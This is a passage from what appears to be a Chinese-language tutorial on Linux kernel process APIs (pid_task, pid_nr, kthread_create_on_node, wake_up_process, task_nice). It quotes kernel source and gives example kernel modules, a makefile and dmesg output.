<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数pid: pid类型指针，存储进程描述符相关信息</span></span><br><span class="line"><span class="comment">// 参数type: pid_type类型变量</span></span><br><span class="line"><span class="keyword">struct</span> task_struct *<span class="title function_">pid_task</span><span class="params">(<span class="keyword">struct</span> pid *pid, <span class="keyword">enum</span> pid_type type)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">result</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (pid) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">first</span>;</span></span><br><span class="line">		first = rcu_dereference_check(hlist_first_rcu(&amp;pid-&gt;tasks[type]),</span><br><span class="line">					      lockdep_tasklist_lock_is_held());</span><br><span class="line">		<span class="keyword">if</span> (first)</span><br><span class="line">			result = hlist_entry(first, <span class="keyword">struct</span> task_struct, pid_links[(type)]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(pid_task);</span><br></pre></td></tr></table></figure></div>

<h2 id="pid-nr"><a href="#pid-nr" class="headerlink" title="pid_nr()"></a>pid_nr()</h2><p>获取进程全局进程号。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * the helpers to get the pid&#x27;s id seen from different namespaces</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * pid_nr()    : global id, i.e. the id seen from the init namespace;</span></span><br><span class="line"><span class="comment"> * pid_vnr()   : virtual id, i.e. the id seen from the pid namespace of</span></span><br><span class="line"><span class="comment"> *               current.</span></span><br><span class="line"><span class="comment"> * pid_nr_ns() : id seen from the ns specified.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * see also task_xid_nr() etc in include/linux/sched.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">pid_t</span> <span class="title function_">pid_nr</span><span class="params">(<span class="keyword">struct</span> pid *pid)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">pid_t</span> nr = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (pid)</span><br><span class="line">		nr = pid-&gt;numbers[<span class="number">0</span>].nr;</span><br><span class="line">	<span class="keyword">return</span> nr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">pid_nr_ns</span><span class="params">(<span class="keyword">struct</span> pid *pid, <span class="keyword">struct</span> pid_namespace *ns)</span>;</span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">pid_vnr</span><span class="params">(<span class="keyword">struct</span> pid *pid)</span>;</span><br></pre></td></tr></table></figure></div>

<h2 id="task-pid-nr-ns"><a href="#task-pid-nr-ns" class="headerlink" title="__task_pid_nr_ns()"></a>__task_pid_nr_ns()</h2><p>获取进程编号。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pid_t</span> __task_pid_nr_ns(<span class="keyword">struct</span> task_struct *task, <span class="keyword">enum</span> pid_type type,</span><br><span class="line">			<span class="keyword">struct</span> pid_namespace *ns)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">pid_t</span> nr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	<span class="keyword">if</span> (!ns)</span><br><span class="line">		ns = task_active_pid_ns(current);</span><br><span class="line">	<span class="keyword">if</span> (likely(pid_alive(task)))</span><br><span class="line">		nr = pid_nr_ns(rcu_dereference(*task_pid_ptr(task, type)), ns);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> nr;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__task_pid_nr_ns);</span><br></pre></td></tr></table></figure></div>

<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><strong>pidtest.c</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/pid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">pidtest_initfunc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">kernelpid</span> =</span> find_get_pid(current-&gt;pid);</span><br><span class="line">	printk(<span class="string">&quot;count ==&gt; %d\n&quot;</span>, kernelpid-&gt;count);</span><br><span class="line">	printk(<span class="string">&quot;level ==&gt; %d\n&quot;</span>, kernelpid-&gt;level);</span><br><span class="line">	printk(<span class="string">&quot;numbers ==&gt; %d\n&quot;</span>, kernelpid-&gt;numbers[kernelpid-&gt;level].nr);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> iNr = pid_nr(kernelpid);</span><br><span class="line">	printk(<span class="string">&quot;nr ==&gt; %d\n&quot;</span>, iNr);</span><br><span class="line">	printk(<span class="string">&quot;tgid ==&gt; %d\n&quot;</span>, current-&gt;tgid);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">ttask</span> =</span> pid_task(kernelpid, PIDTYPE_PID);</span><br><span class="line">	printk(<span class="string">&quot;state ==&gt;  %ld\n&quot;</span>, ttask-&gt;state);</span><br><span class="line">	printk(<span class="string">&quot;pid ==&gt; %d\n&quot;</span>, ttask-&gt;pid);</span><br><span class="line">	</span><br><span class="line">	<span class="type">pid_t</span> rest = __task_pid_nr_ns(ttask, PIDTYPE_PID, kernelpid-&gt;numbers[kernelpid-&gt;level].ns);</span><br><span class="line">	printk(<span class="string">&quot;rest ==&gt; %d&quot;</span>, rest);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">pidtest_exitfunc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;exit...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// “核心内核”（大概包括frob_task_by_pid_hard及其同类）中的frob_task_by_pid_hard是GPL的，需要将模块的许可证声明为GPL。</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">module_init(pidtest_initfunc);</span><br><span class="line">module_exit(pidtest_exitfunc);</span><br></pre></td></tr></table></figure></div>

<p><strong>makefile</strong></p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">obj-m:=pidtest.o</span></span><br><span class="line">CONFIG_MODULE_SIG=n</span><br><span class="line">CURRENT_PATH:=<span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINUX_KERNEL:=<span class="variable">$(<span class="built_in">shell</span> uname -r)</span></span><br><span class="line">LINUX_KERNEL_PATH:=/usr/src/linux-headers-<span class="variable">$(LINUX_KERNEL)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.mk .tmp_versions Module.symvers *.mod.c *.o *.ko .*.cmd Module.markers modules.order *.a *.mod</span><br></pre></td></tr></table></figure></div>

<p><strong>dmesg -c</strong></p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">root@kernel:~/pidtest<span class="comment"># dmesg -c</span></span><br><span class="line">[11762.163090] count ==&gt; 3</span><br><span class="line">[11762.163090] level ==&gt; 0</span><br><span class="line">[11762.163091] numbers ==&gt; 40250</span><br><span class="line">[11762.163091] nr ==&gt; 40250</span><br><span class="line">[11762.163091] tgid ==&gt; 40250</span><br><span class="line">[11762.163091] state ==&gt;  0</span><br><span class="line">[11762.163091] pid ==&gt; 40250</span><br></pre></td></tr></table></figure></div>

<h1 id="进程调度常用API"><a href="#进程调度常用API" class="headerlink" title="进程调度常用API"></a>进程调度常用API</h1><h2 id="kthread-create-on-node"><a href="#kthread-create-on-node" class="headerlink" title="kthread_create_on_node()"></a>kthread_create_on_node()</h2><p>指定存储节点创建新内核线程。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数 int (*threadfn) (void *data) 是一个函数指针，即它是一个函数，此函数是此进程执行时执行的函数，此函数返回值为int型，</span></span><br><span class="line"><span class="comment">// 		参数是一个void型指针。</span></span><br><span class="line"><span class="comment">// 参数void * data是一个void型指针，是传递给第一个参数所代表函数的参数，即进程执行时函数的参数。</span></span><br><span class="line"><span class="comment">// 参数node为存储节点编号，内核将内存区域进程编号，如果指定编号，则创建的新进程在指定的内存区域，如果不指定，设置为-1，则内核随机</span></span><br><span class="line"><span class="comment">// 		选择内存区域。</span></span><br><span class="line"><span class="comment">// namefmt为进程的输出类型名。</span></span><br><span class="line"><span class="keyword">struct</span> task_struct *<span class="title function_">kthread_create_on_node</span><span class="params">(<span class="type">int</span> (*threadfn)(<span class="type">void</span> *data),</span></span><br><span class="line"><span class="params">					   <span class="type">void</span> *data, <span class="type">int</span> node,</span></span><br><span class="line"><span class="params">					   <span class="type">const</span> <span class="type">char</span> namefmt[],</span></span><br><span class="line"><span class="params">					   ...)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">	va_list args;</span><br><span class="line"></span><br><span class="line">	va_start(args, namefmt);</span><br><span class="line">	task = __kthread_create_on_node(threadfn, data, node, namefmt, args);</span><br><span class="line">	va_end(args);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> task;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kthread_create_on_node);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *__<span class="title">kthread_create_on_node</span>(<span class="title">int</span> (*<span class="title">threadfn</span>)(<span class="title">void</span> *<span class="title">data</span>),</span></span><br><span class="line"><span class="class">						    <span class="title">void</span> *<span class="title">data</span>, <span class="title">int</span> <span class="title">node</span>,</span></span><br><span class="line"><span class="class">						    <span class="title">const</span> <span class="title">char</span> <span class="title">namefmt</span>[],</span></span><br><span class="line"><span class="class">						    <span class="title">va_list</span> <span class="title">args</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DECLARE_COMPLETION_ONSTACK(done);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kthread_create_info</span> *<span class="title">create</span> =</span> kmalloc(<span class="keyword">sizeof</span>(*create),</span><br><span class="line">						     GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!create)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line">	create-&gt;threadfn = threadfn;</span><br><span class="line">	create-&gt;data = data;</span><br><span class="line">	create-&gt;node = node;</span><br><span class="line">	create-&gt;done = &amp;done;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;kthread_create_lock);</span><br><span class="line">	list_add_tail(&amp;create-&gt;<span class="built_in">list</span>, &amp;kthread_create_list);</span><br><span class="line">	spin_unlock(&amp;kthread_create_lock);</span><br><span class="line"></span><br><span class="line">	wake_up_process(kthreadd_task);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Wait for completion in killable state, for I might be chosen by</span></span><br><span class="line"><span class="comment">	 * the OOM killer while kthreadd is trying to allocate memory for</span></span><br><span class="line"><span class="comment">	 * new kernel thread.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(wait_for_completion_killable(&amp;done))) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If I was SIGKILLed before kthreadd (or new kernel thread)</span></span><br><span class="line"><span class="comment">		 * calls complete(), leave the cleanup of this structure to</span></span><br><span class="line"><span class="comment">		 * that thread.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (xchg(&amp;create-&gt;done, <span class="literal">NULL</span>))</span><br><span class="line">			<span class="keyword">return</span> ERR_PTR(-EINTR);</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * kthreadd (or new kernel thread) will call complete()</span></span><br><span class="line"><span class="comment">		 * shortly.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		wait_for_completion(&amp;done);</span><br><span class="line">	&#125;</span><br><span class="line">	task = create-&gt;result;</span><br><span class="line">	<span class="keyword">if</span> (!IS_ERR(task)) &#123;</span><br><span class="line">		<span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_param</span> <span class="title">param</span> =</span> &#123; .sched_priority = <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="type">char</span> name[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * task is already visible to other tasks, so updating</span></span><br><span class="line"><span class="comment">		 * COMM must be protected.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		vsnprintf(name, <span class="keyword">sizeof</span>(name), namefmt, args);</span><br><span class="line">		set_task_comm(task, name);</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * root may have changed our (kthreadd&#x27;s) priority or CPU mask.</span></span><br><span class="line"><span class="comment">		 * The kernel thread should not inherit these properties.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		sched_setscheduler_nocheck(task, SCHED_NORMAL, &amp;param);</span><br><span class="line">		set_cpus_allowed_ptr(task, cpu_all_mask);</span><br><span class="line">	&#125;</span><br><span class="line">	kfree(create);</span><br><span class="line">	<span class="keyword">return</span> task;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="wake-up-process"><a href="#wake-up-process" class="headerlink" title="wake_up_process()"></a>wake_up_process()</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回0：当前进程处于RUNNING状态或唤醒失败。</span></span><br><span class="line"><span class="comment">// 返回1：当前进程不处于RUNNING状态，唤醒成功。</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">wake_up_process</span><span class="params">(<span class="keyword">struct</span> task_struct *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> try_to_wake_up(p, TASK_NORMAL, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">try_to_wake_up</span><span class="params">(<span class="keyword">struct</span> task_struct *p, <span class="type">unsigned</span> <span class="type">int</span> state, <span class="type">int</span> wake_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">	<span class="type">int</span> cpu, success = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	preempt_disable();</span><br><span class="line">	<span class="keyword">if</span> (p == current) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We&#x27;re waking current, this means &#x27;p-&gt;on_rq&#x27; and &#x27;task_cpu(p)</span></span><br><span class="line"><span class="comment">		 * == smp_processor_id()&#x27;. Together this means we can special</span></span><br><span class="line"><span class="comment">		 * case the whole &#x27;p-&gt;on_rq &amp;&amp; ttwu_remote()&#x27; case below</span></span><br><span class="line"><span class="comment">		 * without taking any locks.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * In particular:</span></span><br><span class="line"><span class="comment">		 *  - we rely on Program-Order guarantees for all the ordering,</span></span><br><span class="line"><span class="comment">		 *  - we&#x27;re serialized against set_special_state() by virtue of</span></span><br><span class="line"><span class="comment">		 *    it disabling IRQs (this allows not taking -&gt;pi_lock).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!(p-&gt;state &amp; state))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		success = <span class="number">1</span>;</span><br><span class="line">		cpu = task_cpu(p);</span><br><span class="line">		trace_sched_waking(p);</span><br><span class="line">		p-&gt;state = TASK_RUNNING;</span><br><span class="line">		trace_sched_wakeup(p);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we are going to wake up a thread waiting for CONDITION we</span></span><br><span class="line"><span class="comment">	 * need to ensure that CONDITION=1 done by the caller can not be</span></span><br><span class="line"><span class="comment">	 * reordered with p-&gt;state check below. This pairs with mb() in</span></span><br><span class="line"><span class="comment">	 * set_current_state() the waiting thread does.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	raw_spin_lock_irqsave(&amp;p-&gt;pi_lock, flags);</span><br><span class="line">	smp_mb__after_spinlock();</span><br><span class="line">	<span class="keyword">if</span> (!(p-&gt;state &amp; state))</span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line"></span><br><span class="line">	trace_sched_waking(p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We&#x27;re going to change -&gt;state: */</span></span><br><span class="line">	success = <span class="number">1</span>;</span><br><span class="line">	cpu = task_cpu(p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ensure we load p-&gt;on_rq _after_ p-&gt;state, otherwise it would</span></span><br><span class="line"><span class="comment">	 * be possible to, falsely, observe p-&gt;on_rq == 0 and get stuck</span></span><br><span class="line"><span class="comment">	 * in smp_cond_load_acquire() below.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * sched_ttwu_pending()			try_to_wake_up()</span></span><br><span class="line"><span class="comment">	 *   STORE p-&gt;on_rq = 1			  LOAD p-&gt;state</span></span><br><span class="line"><span class="comment">	 *   UNLOCK rq-&gt;lock</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * __schedule() (switch to task &#x27;p&#x27;)</span></span><br><span class="line"><span class="comment">	 *   LOCK rq-&gt;lock			  smp_rmb();</span></span><br><span class="line"><span class="comment">	 *   smp_mb__after_spinlock();</span></span><br><span class="line"><span class="comment">	 *   UNLOCK rq-&gt;lock</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * [task p]</span></span><br><span class="line"><span class="comment">	 *   STORE p-&gt;state = UNINTERRUPTIBLE	  LOAD p-&gt;on_rq</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Pairs with the LOCK+smp_mb__after_spinlock() on rq-&gt;lock in</span></span><br><span class="line"><span class="comment">	 * __schedule().  See the comment for smp_mb__after_spinlock().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	smp_rmb();</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;on_rq &amp;&amp; ttwu_remote(p, wake_flags))</span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ensure we load p-&gt;on_cpu _after_ p-&gt;on_rq, otherwise it would be</span></span><br><span class="line"><span class="comment">	 * possible to, falsely, observe p-&gt;on_cpu == 0.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * One must be running (-&gt;on_cpu == 1) in order to remove oneself</span></span><br><span class="line"><span class="comment">	 * from the runqueue.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * __schedule() (switch to task &#x27;p&#x27;)	try_to_wake_up()</span></span><br><span class="line"><span class="comment">	 *   STORE p-&gt;on_cpu = 1		  LOAD p-&gt;on_rq</span></span><br><span class="line"><span class="comment">	 *   UNLOCK rq-&gt;lock</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * __schedule() (put &#x27;p&#x27; to sleep)</span></span><br><span class="line"><span class="comment">	 *   LOCK rq-&gt;lock			  smp_rmb();</span></span><br><span class="line"><span class="comment">	 *   smp_mb__after_spinlock();</span></span><br><span class="line"><span class="comment">	 *   STORE p-&gt;on_rq = 0			  LOAD p-&gt;on_cpu</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Pairs with the LOCK+smp_mb__after_spinlock() on rq-&gt;lock in</span></span><br><span class="line"><span class="comment">	 * __schedule().  See the comment for smp_mb__after_spinlock().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	smp_rmb();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If the owning (remote) CPU is still in the middle of schedule() with</span></span><br><span class="line"><span class="comment">	 * this task as prev, wait until its done referencing the task.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Pairs with the smp_store_release() in finish_task().</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * This ensures that tasks getting woken will be fully ordered against</span></span><br><span class="line"><span class="comment">	 * their previous state and preserve Program Order.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	smp_cond_load_acquire(&amp;p-&gt;on_cpu, !VAL);</span><br><span class="line"></span><br><span class="line">	p-&gt;sched_contributes_to_load = !!task_contributes_to_load(p);</span><br><span class="line">	p-&gt;state = TASK_WAKING;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;in_iowait) &#123;</span><br><span class="line">		delayacct_blkio_end(p);</span><br><span class="line">		<span class="type">atomic_dec</span>(&amp;task_rq(p)-&gt;nr_iowait);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cpu = select_task_rq(p, p-&gt;wake_cpu, SD_BALANCE_WAKE, wake_flags);</span><br><span class="line">	<span class="keyword">if</span> (task_cpu(p) != cpu) &#123;</span><br><span class="line">		wake_flags |= WF_MIGRATED;</span><br><span class="line">		psi_ttwu_dequeue(p);</span><br><span class="line">		set_task_cpu(p, cpu);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* CONFIG_SMP */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;in_iowait) &#123;</span><br><span class="line">		delayacct_blkio_end(p);</span><br><span class="line">		<span class="type">atomic_dec</span>(&amp;task_rq(p)-&gt;nr_iowait);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SMP */</span></span></span><br><span class="line"></span><br><span class="line">	ttwu_queue(p, cpu, wake_flags);</span><br><span class="line">unlock:</span><br><span class="line">	raw_spin_unlock_irqrestore(&amp;p-&gt;pi_lock, flags);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">if</span> (success)</span><br><span class="line">		ttwu_stat(p, cpu, wake_flags);</span><br><span class="line">	preempt_enable();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/pid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">pts_thread</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test_func</span><span class="params">(<span class="type">void</span>* argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> iData = <span class="number">-1</span>;</span><br><span class="line">	printk(<span class="string">&quot;test_func pid ==&gt; %d\n&quot;</span>, current-&gt;pid);</span><br><span class="line">	</span><br><span class="line">	iData = wake_up_process(pts_thread);</span><br><span class="line">	printk(<span class="string">&quot;the state of pts_thread after wake_up_process ==&gt; %ld\n&quot;</span>, pts_thread-&gt;state);</span><br><span class="line">	printk(<span class="string">&quot;the res of the wake_up_process ==&gt; %d&quot;</span>, iData);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">test_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> result_data = <span class="number">-1</span>;</span><br><span class="line">	<span class="type">char</span> cName[] = <span class="string">&quot;kthread_test.c%s&quot;</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">pResult</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">long</span> time_out;</span><br><span class="line">	</span><br><span class="line">	<span class="type">wait_queue_head_t</span> head;</span><br><span class="line">	<span class="type">wait_queue_entry_t</span> data;</span><br><span class="line">	</span><br><span class="line">	pResult = kthread_create_on_node(test_func, <span class="literal">NULL</span>, <span class="number">-1</span>, cName);</span><br><span class="line">	printk(<span class="string">&quot;new kthread pid ==&gt; %d\n&quot;</span>, pResult-&gt;pid);</span><br><span class="line">	printk(<span class="string">&quot;init pid ==&gt; %d\n&quot;</span>, current-&gt;pid);</span><br><span class="line">	</span><br><span class="line">	init_waitqueue_head(&amp;head);</span><br><span class="line">	init_waitqueue_entry(&amp;data, current);</span><br><span class="line">	add_wait_queue(&amp;head, &amp;data);</span><br><span class="line">	pts_thread = current;</span><br><span class="line">	</span><br><span class="line">	result_data = wake_up_process(pResult);</span><br><span class="line">	printk(<span class="string">&quot;after wake_up pResult, result_data ==&gt; %d&quot;</span>, result_data);</span><br><span class="line">	time_out = schedule_timeout_uninterruptible(<span class="number">2000</span>*<span class="number">10</span>);</span><br><span class="line">	</span><br><span class="line">	result_data = wake_up_process(current);</span><br><span class="line">	printk(<span class="string">&quot;after wake up current, result_data ==&gt; %d&quot;</span>, result_data);</span><br><span class="line">	</span><br><span class="line">	printk(<span class="string">&quot;time_out ==&gt; %ld&quot;</span>, time_out);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">test_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;mod-kthread_test exit normal...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">module_init(test_init);</span><br><span class="line">module_exit(test_exit);</span><br></pre></td></tr></table></figure></div>

<h2 id="task-nice"><a href="#task-nice" class="headerlink" title="task_nice()"></a>task_nice()</h2><p>获取进程对应nice值。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回进程的nice值</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">task_nice</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> task_struct *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> PRIO_TO_NICE((p)-&gt;static_prio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>复习</p>
